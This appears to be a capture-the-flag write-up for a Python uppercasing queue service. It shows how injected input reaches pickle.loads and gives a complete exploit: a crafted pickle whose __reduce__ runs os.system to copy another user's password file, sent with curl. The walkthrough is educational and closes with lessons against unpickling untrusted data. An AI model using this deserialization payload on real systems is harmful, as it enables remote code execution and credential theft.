## Level 5

This may be the most realistic of all the challenges:
the code is not trivial,
it is not badly written,
there are no obvious mistakes.
But there is one grave mistake in it,
which is not easy to notice,
and not easy to exploit.
It's a kind of vulnerability that can happen to anyone.

What can we see easily?
The description tells us that `level05` is running an uppercasing service.
We can make calls to it using `curl`,
for example:
```
level04@box:~$ curl localhost:8005 -d 'hello friend'
{
    "processing_time": 1.621246337890625e-05, 
    "queue_time": 0.2028050422668457, 
    "result": "HELLO FRIEND"
}
```

The description also tells us that the service is structured as a queue server and a queue worker.
Sure enough,
in the `main` method we see two modes of invocations of the program,
using the `worker` or `server` as the command line argument.

As usual,
let's start by playing with the input,
and try to misuse the service with invalid values:
```
level04@box:~$ curl localhost:8005 -d $(printf '\x11\x12')
...
level04@box:~$ curl localhost:8005 -d $(python -c 'print "a" * 100')
...
level04@box:~$ curl localhost:8005 -d $(python -c 'print "a" * 1000')
...
level04@box:~$ curl localhost:8005 -d $(python -c 'print "a" * 10000')
...
```

Nothing really interesting seems to happen.
Let's see how the input is really handled by digging in the code.
Let's continue investigating the input,
by tracking down how it is processed.

As we are sending the input using HTTP,
let's look for the HTTP service implementation in the code:
it's in the `QueueHttpServer` class,
which has two methods for handling GET and POST requests.
The `do_GET` method simply prints a help message and doesn't handle any inputs,
so there is nothing we can do there.
The `do_POST` method takes the POST data and passes it to a new `QueueServer` instance:
```
def do_POST(self):
        length = int(self.headers.getheader('content-length'))
        post_data = self.rfile.read(length)
        raw_data = urllib.unquote(post_data)

        queue = QueueServer()
        job = Job()
        type, data, job = queue.run_job(data=raw_data, job=job)
        # ...
```
That in turn passes the input to `QueueUtils.enqueue`:
```
class QueueServer(object):
    # Called in server
    def run_job(self, data, job):
        QueueUtils.enqueue('JOB', data, job)
        # ...
```
... which in turn passes it to `QueueUtils.serialize`:
```
    @staticmethod
    def enqueue(type, data, job):
        # ...
        serialized = QueueUtils.serialize(type, data, job)
        # ...
```
... where we can finally see something interesting:
```
    @staticmethod
    def serialize(direction, data, job):
        serialized = """type: %s; data: %s; job: %s""" % (direction, data, pickle.dumps(job))
        # ...
```
Remember that the `POST` data we send from `curl` is now in the `data` variable in the code.
What will the serialized string look like?
We can trace back that the value of `type` can be either `JOB` or `RESULT`.
The value of `data` is whatever we send with `curl`.
And the value of job is a `Job` object,
dumped using the `pickle` library,
which seems to convert objects to strings.
We can guess that the object is probably restored later in the program from string to an object.

Is this safe?
Not quite,
as we can control the content of `data`.
What will happen if we send `x; job: hello` as the input?
The serialized string will look something like this:
```
type: JOB; data: x; job: hello; job: ???
```
We don't know yet how this serialized string is used later in the program,
but this kind of input definitely looks like a special corner case that might not be easy to handle well.
Let's see what actually happens if we call the service with such method:
```
level04@box:~$ curl localhost:8005 -d 'x; job: hello'
{
    "result": "Job timed out"
}
```
Yes, that doesn't look too good.
It looks like we have successfully corrupted the job data.
Let's track down what happens to the serialized string.
Notice the `deserialize` method in the `QueueUtils` class:
```
    @staticmethod
    def deserialize(serialized):
        parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
        match = parser.match(serialized)
        direction = match.group(1)
        data = match.group(2)
        job = pickle.loads(match.group(3))
```
Well, well, well.
If you are good at regular expressions the problem may be already obvious,
or we could do a quick test using the Python interpreter to see how our input would impact the processing logic here:
```
level04@box:~$ python
Python 2.7.3 (default, Apr 13 2012, 00:19:31) 
[GCC 4.6.1] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> import re
>>> serialized = 'type: JOB; data: x; job: hello; job: ???'
>>> parser = re.compile('^type: (.*?); data: (.*?); job: (.*?)$', re.DOTALL)
>>> match = parser.match(serialized)
>>> match.group(2)
'x'
>>> match.group(3)
'hello; job: ???'
```
So, what we put in the input string after a semicolon,
will become the beginning of the parameter used in `pickle.loads`.
What can we do with this?
What kind of prefix string can we construct that will do something interesting when you call `pickle.loads` on it?

I'm not really familiar with `pickle`,
but we've seen earlier that `pickle.dumps` creates a string from an object,
and `pickle.loads` seems to do the reverse.
Let's play with this a little in a Python interpreter:
```
>>> import pickle
>>> pickle.dumps('hello')
"S'hello'\np0\n."
>>> pickle.dumps([1,2,3])
'(lp0\nI1\naI2\naI3\na.'
>>> pickle.dumps(pickle.dumps)
'cpickle\ndumps\np0\n.'
>>> pickle.loads(pickle.dumps(pickle.dumps))
<function dumps at 0xb7470a74>
```
As expected, `pickle` can serialize values, objects,
functions to string and convert them back.

To exploit this,
we need to read up a bit about pickle in the documentation:
http://docs.python.org/library/pickle.html
Notice the warning right on the front page:

> Warning The pickle module is not intended to be secure against erroneous or maliciously constructed data. Never unpickle data received from an untrusted or unauthenticated source.

Looks like we are on the right track:
we have already found a way to inject data for "unpickling",
now we just need to find out how can we create a pickle that will reveal the content of the password file.
There is a very interesting item in the documentation:
the `__reduce__()` method:

> When the Pickler encounters an object of a type it knows nothing about — such as an extension type — it looks in two places for a hint of how to pickle it. One alternative is for the object to implement a __reduce__() method. If provided, at pickling time __reduce__() will be called with no arguments, and it must return either a string or a tuple.
> (...)
> When a tuple is returned, it must be between two and five elements long. (...) The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time.
> The semantics of each element are:
> A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.

Based on this we must implement the `__reduce__` method in a certain way:

- Return a tuple
- The first item in the tuple should be a callable
- The second item should be a tuple of arguments for the callable

So, what should be the callable and its arguments?
Perhaps the Python equivalent of the shellcode we used in C programs?
For example,
`os.system` and the argument some appropriate shell command,
like this:
```
import pickle
import os

class Exploit(object):
    def __reduce__(self):
        return (os.system, ('cat /home/level05/.password > /tmp/p',))

print '; job: ' + pickle.dumps(Exploit())
```

Let's save this in a file,
say `exploit.py`,
run it, and save its output:
```
level04@box:~$ python exploit.py > pickle.txt
level04@box:~$ cat pickle.txt
; job: cposix
system
p0
(S'cat /home/level05/.password > /tmp/p'
p1
tp2
Rp3
.
```
Our crafted input has the right prefix,
`; job: `,
let's send this to the service:
```
level04@box:~$ curl localhost:8005 --data-urlencode @pickle.txt
{
    "result": "Job timed out"
}
level04@box:~$ cat /tmp/p
diebasuw
```

Bingo!

What can we learn from all this?

- Read the documentation carefully:
  it warned about the dangers of unpickling untrusted text loud and clear.
  In fact, is it really necessary to use pickles?
  Use JSON serialization instead, it's safer.

- Always validate user input carefully.
  Trace in your code all the places where the user input might pass through,
  and make sure your input validation is strict enough.
